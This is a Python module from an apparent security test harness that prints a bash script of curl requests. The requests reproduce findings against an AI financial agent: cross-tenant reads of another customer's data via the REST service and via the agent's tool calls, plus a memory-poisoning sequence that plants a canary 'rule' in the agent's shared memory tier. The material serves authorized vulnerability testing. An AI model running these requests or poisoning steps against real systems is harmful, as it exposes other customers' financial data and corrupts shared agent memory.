"""Ручной PoC: печатает точные запросы (curl) для воспроизведения находок руками.

Собирается из config/target.yaml, поэтому всегда соответствует текущей цели. Чётко помечает КАНАЛ:
  - [REST] прямой запрос к сервису данных (:8200) — LLM НЕ участвует, чистый HTTP;
  - [AGENT/LLM] сообщение агенту (:8600, OpenAI-совместимо) — агент сам зовёт инструмент;
  - [AGENT/LLM + MEMORY] диалог -> finalize -> перечитать (отравление памяти).
Токен Keycloak берётся свежим прямо в сниппете (не протухает); API-ключ атакующего долгоживущий.
"""

import json

from ..core.config import load
from ..core import provisioning


def _chat(model, field, mode, sid, content):
    return json.dumps({"model": model, field: mode, "session_id": sid,
                       "messages": [{"role": "user", "content": content}]}, ensure_ascii=False)


def build(cfg=None):
    cfg = cfg or load()
    atk, vic = cfg.attacker_default(), cfg.victim_default()
    acct = cfg.by_cus(vic)["account_id"]
    p = cfg.prov
    hdr, field = cfg.auth["header"], cfg.auth["field"]
    vuln, prot = cfg.mode("vulnerable"), cfg.mode("protected")
    data_url = cfg.data("client_by_cus", cus=vic)
    owner_url = cfg.data("account_owner", account_id=acct)
    chat_url = cfg.agent("chat")
    psid = "manual-poison-1"
    fin_url = cfg.agent("finalize", session_id=psid)
    model = cfg.model_id
    key = provisioning.ensure_key(atk, cfg)
    ui_web = "http://localhost:3080"  # LibreChat (глазами)

    bac_prompt = f"Открой портфель клиента с cus {vic}."
    marker = "ОКЕАН"  # чистое слово-канарейка (не кодовый маркер)
    poison = [t.replace("{marker}", marker) for t in cfg.payloads["memory_poisoning"]["benign"][0]["turns"]]

    L = []
    w = L.append
    w("#!/usr/bin/env bash")
    w(f"# Ручной PoC для цели: {cfg.target['target']['name']}")
    w(f"# атакующий cus={atk}  жертва cus={vic}  счёт жертвы={acct}")
    w("set -e")
    w("")
    w("# === Свежий токен атакующего (Keycloak, password-grant) ===")
    w(f"TOKEN=$(curl -s -X POST {cfg.keycloak_token_url()} \\")
    w(f"  -d grant_type=password -d client_id={p['ui_client_id']} -d client_secret={p['ui_client_secret']} \\")
    w(f"  -d username={p['username_tpl'].format(cus=atk)} -d password={p['password_tpl'].format(cus=atk)} "
      f"-d scope={p.get('scope', 'openid')} \\")
    w("  | python3 -c 'import sys,json;print(json.load(sys.stdin)[\"access_token\"])')")
    w(f"KEY={key}   # API-ключ агента для атакующего (долгоживущий)")
    w("")
    w("# ========================================================================")
    w("# F-BAC-DATA  [critical]   КАНАЛ: [REST] прямой запрос к данным, LLM НЕ участвует")
    w(f"# Токеном {atk} читаем данные ЧУЖОГО клиента {vic}.")
    w("# ------------------------------------------------------------------------")
    w(f"echo '--- vulnerable: должен ОТДАТЬ данные (200) ---'")
    w(f"curl -s -H \"Authorization: Bearer $TOKEN\" -H \"{hdr}: {vuln}\" {data_url}; echo")
    w(f"echo '--- protected: должен ЗАКРЫТЬ (403) ---'")
    w(f"curl -s -o /dev/null -w 'HTTP %{{http_code}}\\n' -H \"Authorization: Bearer $TOKEN\" -H \"{hdr}: {prot}\" {data_url}")
    w("")
    w("# ========================================================================")
    w("# F-BAC-OWNER [high]       КАНАЛ: [REST] прямой запрос к данным")
    w(f"# Владелец ЧУЖОГО счёта {acct} резолвится ДАЖE в protected.")
    w("# ------------------------------------------------------------------------")
    w(f"curl -s -H \"Authorization: Bearer $TOKEN\" -H \"{hdr}: {prot}\" {owner_url}; echo")
    w("")
    w("# ========================================================================")
    w("# F-BAC-AGENT [critical]   КАНАЛ: [AGENT/LLM] сообщение агенту, он сам зовёт инструмент")
    w(f"# Просим агента чужие данные; в ответе всплывают отпечатки {vic} (имя/ISIN/кэш).")
    w("# То же самое можно вбить руками в веб-чат " + ui_web + " (но auth_mode там не переключить).")
    w("# ------------------------------------------------------------------------")
    w(f"curl -s -X POST {chat_url} \\")
    w(f"  -H \"Authorization: Bearer $KEY\" -H 'Content-Type: application/json' \\")
    w(f"  -d '{_chat(model, field, vuln, 'manual-bac-1', bac_prompt)}'; echo")
    w("")
    w("# ========================================================================")
    w("# F-POISON    [critical]   КАНАЛ: [AGENT/LLM + MEMORY] диалог -> finalize -> перечитать")
    w(f"# Сажаем общее 'правило' с меткой {marker}, финализируем, затем в НОВОЙ сессии метка всплывает.")
    w("# Вероятностно — если с первого раза не легло, повтори (свежий SID).")
    w("# ------------------------------------------------------------------------")
    w(f"# сессия отравления: {psid}")
    w(f"curl -s -X POST {chat_url} -H \"Authorization: Bearer $KEY\" -H 'Content-Type: application/json' \\")
    w(f"  -d '{_chat(model, field, vuln, psid, poison[0])}' >/dev/null")
    if len(poison) > 1:
        w(f"curl -s -X POST {chat_url} -H \"Authorization: Bearer $KEY\" -H 'Content-Type: application/json' \\")
        w(f"  -d '{_chat(model, field, vuln, psid, poison[1])}' >/dev/null")
    w(f"curl -s -X POST {fin_url} -H \"Authorization: Bearer $KEY\" >/dev/null   # финализация -> консолидация в память")
    w("echo '--- новая сессия: в ответе должна всплыть метка ' " + marker + " ---'")
    w(f"curl -s -X POST {chat_url} -H \"Authorization: Bearer $KEY\" -H 'Content-Type: application/json' \\")
    w(f"  -d '{_chat(model, field, vuln, 'manual-check-1', 'Дай короткий совет по моему портфелю.')}'; echo")
    w("")
    w(f"# Проверка состояния памяти напрямую (нужен mongosh): метка на ОБЩЕМ ярусе = cross-tenant")
    w(f"# mongosh {cfg.mongo['uri']} --quiet --eval "
      f"'db.getSiblingDB(\"{cfg.mongo['db']}\").{cfg.collection('policy')}.find({{}}).toArray()' | grep -i {marker}")
    return "\n".join(L)


if __name__ == "__main__":
    print(build())
